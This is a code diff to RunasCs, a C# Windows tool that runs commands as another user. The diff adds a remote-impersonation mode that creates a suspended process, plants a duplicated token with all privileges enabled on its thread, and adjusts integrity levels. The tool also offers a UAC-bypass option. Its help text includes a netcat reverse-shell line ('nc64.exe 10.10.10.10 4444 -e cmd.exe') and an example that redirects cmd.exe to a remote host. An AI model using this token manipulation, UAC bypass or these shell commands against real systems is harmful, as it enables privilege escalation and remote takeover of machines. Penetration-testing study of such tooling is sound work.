@@ -32,7 +32,7 @@ public class RunasCs
     private const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
     private const int BUFFER_SIZE_PIPE = 1048576;
     private const uint CREATE_NO_WINDOW = 0x08000000;
-    private const uint GENERIC_ALL = 0x10000000;
+    private const uint CREATE_SUSPENDED = 0x00000004;
     private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
     private const uint DUPLICATE_SAME_ACCESS = 0x00000002;
     private const uint DACL_SECURITY_INFORMATION = 0x00000004;
@@ -169,7 +169,13 @@ public class RunasCs
     private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);
 
     [DllImport("advapi32.dll", SetLastError=true)]
-    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+    private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    private static extern bool SetThreadToken(ref IntPtr pHandle, IntPtr hToken);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern int ResumeThread(IntPtr hThread);
 
     [DllImport("advapi32.dll", SetLastError = true)]
     static extern bool RevertToSelf();
@@ -178,9 +184,16 @@ public class RunasCs
     [return: MarshalAs(UnmanagedType.Bool)]
     private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName,[MarshalAs(UnmanagedType.LPStr)] string pszDomain,[MarshalAs(UnmanagedType.LPStr)] string pszPassword,int dwLogonType,int dwLogonProvider,ref IntPtr phToken);
     
-    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
-    private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, int TokenType, ref IntPtr DuplicateTokenHandle);
-    
+    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx", SetLastError = true)]
+    private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, IntPtr lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, int TokenType, ref IntPtr DuplicateTokenHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = "CreateProcess")]
+    private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);
+
     [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
     private static extern bool CreateProcessWithLogonW(String userName,String domain,String password,UInt32 logonFlags,String applicationName,String commandLine,uint creationFlags,UInt32 environment,String currentDirectory,ref STARTUPINFO startupInfo,out  ProcessInformation processInformation);
     
@@ -308,11 +321,25 @@ public class RunasCs
         return socket;
     }
 
+    private static bool ImpersonateLoggedOnUserWithProperIL(IntPtr hToken, out IntPtr hTokenDuplicate) {
+        IntPtr hTokenDuplicateLocal = new IntPtr(0);
+        bool result = false;
+        result = DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenImpersonation, ref hTokenDuplicateLocal);
+        if (result == false)
+            throw new RunasCsException("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());
+        if(AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicateLocal))
+            AccessToken.SetTokenIntegrityLevel(hTokenDuplicateLocal, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
+        ImpersonateLoggedOnUser(hTokenDuplicateLocal);
+        hTokenDuplicate = hTokenDuplicateLocal;
+        return result;
+    }
+
     private static void GetUserEnvironmentBlock(IntPtr hToken, string username, bool forceProfileCreation, out IntPtr lpEnvironment)
     {
         bool success = false;
         lpEnvironment = new IntPtr(0);
         PROFILEINFO profileInfo = new PROFILEINFO();
+        IntPtr hTokenDuplicate;
         if (forceProfileCreation) {
             profileInfo.dwSize = Marshal.SizeOf(profileInfo);
             profileInfo.lpUserName = username;
@@ -323,7 +350,7 @@ public class RunasCs
                 Console.Out.Flush();
             }
         }
-        ImpersonateLoggedOnUser(hToken);
+        ImpersonateLoggedOnUserWithProperIL(hToken, out hTokenDuplicate);
         try {
             CreateEnvironmentBlock(out lpEnvironment, hToken, false);
         }
@@ -332,16 +359,17 @@ public class RunasCs
             success = false;
         }
         RevertToSelf();
+        CloseHandle(hTokenDuplicate);
         if (forceProfileCreation && success) UnloadUserProfile(hToken, profileInfo.hProfile);
     }
 
     private static bool IsUserProfileDirectoryCreated(string username, string password, string domainName, int logonType) {
         bool result = false;
-        IntPtr hToken = IntPtr.Zero;
+        IntPtr hToken = IntPtr.Zero, hTokenDuplicate = IntPtr.Zero;
         result = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
         if (result == false)
             throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
-        ImpersonateLoggedOnUser(hToken);
+        ImpersonateLoggedOnUserWithProperIL(hToken, out hTokenDuplicate);
         try
         {
             // obtain USERPROFILE value
@@ -356,6 +384,7 @@ public class RunasCs
         }
         RevertToSelf();
         CloseHandle(hToken);
+        CloseHandle(hTokenDuplicate);
         return result;
     }
 
@@ -417,7 +446,7 @@ public class RunasCs
         this.stationDaclObj = null;
     }
 
-    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool createUserProfile, bool bypassUac)
+    public string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote, bool createUserProfile, bool bypassUac, bool remoteImpersonation)
     /*
         int createProcessFunction:
             0: CreateProcessAsUserW();
@@ -454,17 +483,14 @@ public class RunasCs
             }
             CloseHandle(this.hOutputReadTmp);
             this.hOutputReadTmp = IntPtr.Zero;
-
             UInt32 PIPE_NOWAIT = 0x00000001;
             if (!SetNamedPipeHandleState(this.hOutputRead, ref PIPE_NOWAIT, IntPtr.Zero, IntPtr.Zero)) {
                 throw new RunasCsException("SetNamedPipeHandleState failed with error code: " + Marshal.GetLastWin32Error());
             }
-
             startupInfo.dwFlags = Startf_UseStdHandles;
             startupInfo.hStdOutput = this.hOutputWrite;
             startupInfo.hStdError = this.hErrorWrite;
             commandLine = ParseCommonProcessesInCommandline(commandLine);
-
         } else if (remote != null) {
             this.socket = ConnectRemote(remote);
             startupInfo.dwFlags = Startf_UseStdHandles;
@@ -476,31 +502,115 @@ public class RunasCs
         desktopName = this.stationDaclObj.AddAclToActiveWindowStation(domainName, username, logonType);
         startupInfo.lpDesktop = desktopName;
 
-        if (logonType != LOGON32_LOGON_NEW_CREDENTIALS && !createUserProfile && !IsUserProfileDirectoryCreated(username, password, domainName, logonType)) {
+        if (logonType != LOGON32_LOGON_NEW_CREDENTIALS && !createUserProfile && !IsUserProfileDirectoryCreated(username, password, domainName, logonType))
+        {
             Console.Out.WriteLine("[*] Warning: User profile directory for user " + username + " does not exists. Probably this user never logged on on this machine.");
             Console.Out.Flush();
         }
 
-        if(createProcessFunction == 2){
-            if (logonType != LOGON32_LOGON_INTERACTIVE && logonType != LOGON32_LOGON_NEW_CREDENTIALS && !bypassUac) {
-                Console.Out.WriteLine("[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type " + logonType.ToString() + ". Reverting to logon type Interactive (2)...");
-                Console.Out.Flush();
-            }
+        if (remoteImpersonation)
+        {
+            IntPtr hToken = new IntPtr(0);
+            IntPtr hTokenDuplicate = new IntPtr(0);
+            IntPtr lpEnvironment = IntPtr.Zero;
             if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
+                success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_WINNT50, ref hToken);
+            else
+                success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
+            if (success == false)
+                throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
+            success = DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TokenImpersonation, ref hTokenDuplicate);
+            if (success == false)
+                throw new RunasCsException("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());
+            if (AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token) < AccessToken.GetTokenIntegrityLevel(hTokenDuplicate))
+                AccessToken.SetTokenIntegrityLevel(hTokenDuplicate, AccessToken.GetTokenIntegrityLevel(WindowsIdentity.GetCurrent().Token));
+            // enable all privileges assigned to the token
+            if (logonType != LOGON32_LOGON_NETWORK && logonType != LOGON32_LOGON_NETWORK_CLEARTEXT)
+                AccessToken.EnableAllPrivileges(hTokenDuplicate);
+            GetUserEnvironmentBlock(hTokenDuplicate, username, createUserProfile, out lpEnvironment);
+            success = CreateProcess(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
+            if (success == false)
+                throw new RunasCsException("CreateProcess failed with error code: " + Marshal.GetLastWin32Error());
+            IntPtr hTokenProcess = IntPtr.Zero;
+            success = OpenProcessToken(processInfo.process, AccessToken.TOKEN_ALL_ACCESS, out hTokenProcess);
+            if (success == false)
+                throw new RunasCsException("OpenProcessToken failed with error code: " + Marshal.GetLastWin32Error());
+            AccessToken.SetTokenIntegrityLevel(hTokenProcess, AccessToken.GetTokenIntegrityLevel(hTokenDuplicate));
+            // this will solve some issues, e.g. Access Denied errors when running whoami.exe
+            SetSecurityInfo(hTokenProcess, SE_OBJECT_TYPE.SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
+            success = SetThreadToken(ref processInfo.thread, hTokenDuplicate);
+            if (success == false)
+                throw new RunasCsException("SetThreadToken failed with error code: " + Marshal.GetLastWin32Error());
+            if(ResumeThread(processInfo.thread) == -1)
+                throw new RunasCsException("ResumeThread failed with error code: " + Marshal.GetLastWin32Error());
+            CloseHandle(hToken);
+            CloseHandle(hTokenDuplicate);
+            CloseHandle(hTokenProcess);
+        }
+        else {
+            if (createProcessFunction == 2)
             {
-                if (domainName == "")
-                    domainName = ".";
-                success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
-                if (success == false)
-                    throw new RunasCsException("CreateProcessWithLogonW logon type 9 failed with " + Marshal.GetLastWin32Error());
+                if (logonType != LOGON32_LOGON_INTERACTIVE && logonType != LOGON32_LOGON_NEW_CREDENTIALS && !bypassUac)
+                {
+                    Console.Out.WriteLine("[*] Warning: Using function CreateProcessWithLogonW is not compatible with logon type " + logonType.ToString() + ". Reverting to logon type Interactive (2)...");
+                    Console.Out.Flush();
+                }
+                if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
+                {
+                    if (domainName == "")
+                        domainName = ".";
+                    success = CreateProcessWithLogonW(username, domainName, password, LOGON_NETCREDENTIALS_ONLY, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+                    if (success == false)
+                        throw new RunasCsException("CreateProcessWithLogonW logon type 9 failed with " + Marshal.GetLastWin32Error());
+                }
+                else
+                {
+                    IntPtr hTokenUacCheck = new IntPtr(0);
+                    // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon 
+                    success = LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenUacCheck);
+                    if (success == false)
+                        throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
+                    if (AccessToken.IsLimitedUACToken(hTokenUacCheck, username, domainName, password))
+                    {
+                        if (bypassUac)
+                        {
+                            success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, null, commandLine, ref startupInfo, out processInfo);
+                            if (success == false)
+                                throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
+                        }
+                        else
+                        {
+                            Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
+                            Console.Out.Flush();
+                            success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+                            if (success == false)
+                                throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
+                        }
+                    }
+                    else
+                    {
+                        success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
+                        if (success == false)
+                            throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
+                    }
+                    CloseHandle(hTokenUacCheck);
+                }
             }
-            else {
-                IntPtr hTokenUacCheck = new IntPtr(0);
-                // we use the logon type 2 - Interactive because CreateProcessWithLogonW internally use this logon type for the logon 
-                success = LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenUacCheck);
+            else
+            {
+                IntPtr hToken = new IntPtr(0);
+                IntPtr hTokenDuplicate = new IntPtr(0);
+                if (logonType == LOGON32_LOGON_NEW_CREDENTIALS)
+                    success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_WINNT50, ref hToken);
+                else
+                    success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
                 if (success == false)
                     throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
-                if (AccessToken.IsLimitedUACToken(hTokenUacCheck, username, domainName, password))
+                success = DuplicateTokenEx(hToken, AccessToken.TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TokenPrimary, ref hTokenDuplicate);
+                if (success == false)
+                    throw new RunasCsException("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());
+
+                if (AccessToken.IsLimitedUACToken(hTokenDuplicate, username, domainName, password))
                 {
                     if (bypassUac)
                     {
@@ -510,84 +620,45 @@ public class RunasCs
                     }
                     else
                     {
-                        Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
-                        Console.Out.Flush();
-                        success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
-                        if (success == false)
-                            throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
+                        if (logonType == LOGON32_LOGON_INTERACTIVE || logonType == 11 /*CachedInteractive*/)
+                        { // only these logon types are filtered by UAC
+                            Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
+                            Console.Out.Flush();
+                        }
                     }
-                }
-                else {
-                    success = CreateProcessWithLogonW(username, domainName, password, (UInt32)logonFlags, null, commandLine, CREATE_NO_WINDOW, (UInt32)0, null, ref startupInfo, out processInfo);
-                    if (success == false)
-                        throw new RunasCsException("CreateProcessWithLogonW logon type 2 failed with " + Marshal.GetLastWin32Error());
-                }
-                CloseHandle(hTokenUacCheck);
-            }
-        } else {
-            IntPtr hToken = new IntPtr(0);
-            IntPtr hTokenDuplicate = new IntPtr(0);
-            if(logonType == LOGON32_LOGON_NEW_CREDENTIALS)
-                success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_WINNT50, ref hToken);
-            else
-                success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
-            if(success == false)
-                throw new RunasCsException("Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
-
-            SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
-            sa.bInheritHandle       = true;
-            sa.Length               = Marshal.SizeOf(sa);
-            sa.lpSecurityDescriptor = (IntPtr)0;
-            success = DuplicateTokenEx(hToken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TokenPrimary, ref hTokenDuplicate);
-            if(success == false)
-                throw new RunasCsException("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());
-
-            if (AccessToken.IsLimitedUACToken(hTokenDuplicate, username, domainName, password))
-            {
-                if (bypassUac)
-                {
-                    success = CreateProcessWithLogonWUacBypass(logonType, username, domainName, password, null, commandLine, ref startupInfo, out processInfo);
-                    if (success == false)
-                        throw new RunasCsException("CreateProcessWithLogonWUacBypass failed with " + Marshal.GetLastWin32Error());
                 }
                 else
+                    bypassUac = false; // we reset this flag as it's not considered when token is not limited
+
+                if (!bypassUac)
                 {
-                    if (logonType == LOGON32_LOGON_INTERACTIVE || logonType == 11 /*CachedInteractive*/){ // only these logon types are filtered by UAC
-                        Console.Out.WriteLine(String.Format("[*] Warning: Token retrieved for user '{0}' is limited by UAC. Use the flag -b to try a UAC bypass or use the NetworkCleartext (8) in --logon-type.", username));
-                        Console.Out.Flush();
+                    // enable all privileges assigned to the token
+                    if (logonType != LOGON32_LOGON_NETWORK && logonType != LOGON32_LOGON_NETWORK_CLEARTEXT)
+                        AccessToken.EnableAllPrivileges(hTokenDuplicate);
+
+                    if (createProcessFunction == 0)
+                    {
+                        // obtain environmentBlock for desired user
+                        IntPtr lpEnvironment = IntPtr.Zero;
+                        GetUserEnvironmentBlock(hTokenDuplicate, username, createUserProfile, out lpEnvironment);
+                        //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
+                        success = CreateProcessAsUser(hTokenDuplicate, null, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
+                        if (success == false)
+                            throw new RunasCsException("CreateProcessAsUser failed with error code : " + Marshal.GetLastWin32Error());
+                        if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment);
                     }
+                    else if (createProcessFunction == 1)
+                    {
+                        success = CreateProcessWithTokenW(hTokenDuplicate, logonFlags, null, commandLine, CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, out processInfo);
+                        if (success == false)
+                            throw new RunasCsException("CreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error());
+                    }
+
+
                 }
+                CloseHandle(hToken);
+                CloseHandle(hTokenDuplicate);
             }
-            else
-                bypassUac = false; // we reset this flag as it's not considered when token is not limited
-
-            if (!bypassUac) {
-                // enable all privileges assigned to the token
-                if (logonType != LOGON32_LOGON_NETWORK && logonType != LOGON32_LOGON_NETWORK_CLEARTEXT)
-                    AccessToken.EnableAllPrivileges(hTokenDuplicate);
-
-                if (createProcessFunction == 0)
-                {
-                    // obtain environmentBlock for desired user
-                    IntPtr lpEnvironment = IntPtr.Zero;
-                    GetUserEnvironmentBlock(hTokenDuplicate, username, createUserProfile, out lpEnvironment);
-                    //the inherit handle flag must be true otherwise the pipe handles won't be inherited and the output won't be retrieved
-                    success = CreateProcessAsUser(hTokenDuplicate, null, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, Environment.GetEnvironmentVariable("SystemRoot") + "\\System32", ref startupInfo, out processInfo);
-                    if (success == false)
-                        throw new RunasCsException("CreateProcessAsUser failed with error code : " + Marshal.GetLastWin32Error());
-                    if (lpEnvironment != IntPtr.Zero) DestroyEnvironmentBlock(lpEnvironment);
-                }
-                else if (createProcessFunction == 1)
-                {
-                    success = CreateProcessWithTokenW(hTokenDuplicate, logonFlags, null, commandLine, CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, out processInfo);
-                    if (success == false)
-                        throw new RunasCsException("CreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error());
-                }
-
-                
-            }
-            CloseHandle(hToken);
-            CloseHandle(hTokenDuplicate);
         }
 
         if(processTimeout > 0) {
@@ -1178,7 +1249,6 @@ public class WindowStationDACL{
 }
 
 public static class AccessToken{
-
     // Mandatory Label SIDs (integrity levels)
     private const int SECURITY_MANDATORY_UNTRUSTED_RID = 0;
     private const int SECURITY_MANDATORY_LOW_RID = 0x1000;
@@ -1191,6 +1261,23 @@ public static class AccessToken{
     private const int LOGON32_PROVIDER_DEFAULT = 0;
     private const int LOGON32_LOGON_INTERACTIVE = 2;
     private const int LOGON32_LOGON_NETWORK = 3;
+
+    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000;
+    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000;
+    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001;
+    public const UInt32 TOKEN_DUPLICATE = 0x0002;
+    public const UInt32 TOKEN_IMPERSONATE = 0x0004;
+    public const UInt32 TOKEN_QUERY = 0x0008;
+    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010;
+    public const UInt32 TOKEN_ADJUST_PRIVILEGES = 0x0020;
+    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040;
+    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080;
+    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100;
+    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY);
+    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
+        TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
+        TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
+        TOKEN_ADJUST_SESSIONID);
 
     [DllImport("advapi32.dll", SetLastError=true)]
     private static extern bool GetTokenInformation(IntPtr TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation,uint TokenInformationLength,out uint ReturnLength);
@@ -1600,7 +1687,7 @@ Examples:
     Run a background/async process as a specific local user,
         RunasCs.exe user1 password1 ""C:\\nc64.exe 10.10.10.10 4444 -e cmd.exe"" -t 0
     Redirect stdin, stdout and stderr of the specified command to a remote host
-        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.24:4444
+        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
     Run a command simulating the /netonly flag of runas.exe 
         RunasCs.exe user1 password1 ""cmd /c whoami /all"" -d domain -l 9
     Run a command as an Administrator bypassing UAC
@@ -1747,7 +1834,7 @@ Examples:
         string[] remote = null;
         uint processTimeout = 120000;
         int logonType = 8, createProcessFunction = DefaultCreateProcessFunction();
-        bool createUserProfile = false, bypassUac = false;
+        bool createUserProfile = false, bypassUac = false, remoteImpersonation = false;
         
         try {
             for(int ctr = 0; ctr < args.Length; ctr++) {
@@ -1789,6 +1876,11 @@ Examples:
                         bypassUac = true;
                         break;
 
+                    case "-i":
+                    case "--remote-impersonation":
+                        remoteImpersonation = true;
+                        break;
+
                     default:
                         positionals.Add(args[ctr]);
                         break;
@@ -1814,7 +1906,7 @@ Examples:
 
         RunasCs invoker = new RunasCs();
         try {
-            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, createUserProfile, bypassUac);
+            output = invoker.RunAs(username, password, cmd, domain, processTimeout, logonType, createProcessFunction, remote, createUserProfile, bypassUac, remoteImpersonation);
         } catch(RunasCsException e) {
             invoker.CleanupHandles();
             output = String.Format("{0}", e.Message);
@@ -1830,17 +1922,21 @@ class MainClass
     static void Main(string[] args)
     {
         string[] argsTest = new string[10];
-        argsTest[0] = "temp8";
+        argsTest[0] = "temp10";
         argsTest[1] = "pwd";
-        argsTest[2] = "cmd.exe";
-        //argsTest[2] = "C:\\Windows\\system32\\ping.exe -n 30 127.0.0.1";
+        //argsTest[2] = "C:\\Windows\\system32\\whoami /all";
+        //argsTest[2] = "C:\\Windows\\system32\\ping.exe -n 120 127.0.0.1";
+        argsTest[2] = "cmd.exe /c echo i was here > C:\\Windows\\mediumil.txt";
         argsTest[3] = "--function";
         argsTest[4] = "2";
         argsTest[5] = "--logon-type";
         argsTest[6] = "8";
+        argsTest[7] = "--remote-impersonation";
+        //argsTest[8] = "-t";
+        //argsTest[9] = "0";
         //argsTest[7] = "--create-profile";
-        //argsTest[7] = "--remote";
-        //argsTest[8] = "127.0.0.1:3001";
+        //argsTest[8] = "--remote";
+        //argsTest[9] = "127.0.0.1:3001";
         Console.Out.Write(RunasCsMainClass.RunasCsMain(argsTest));
     }
 }
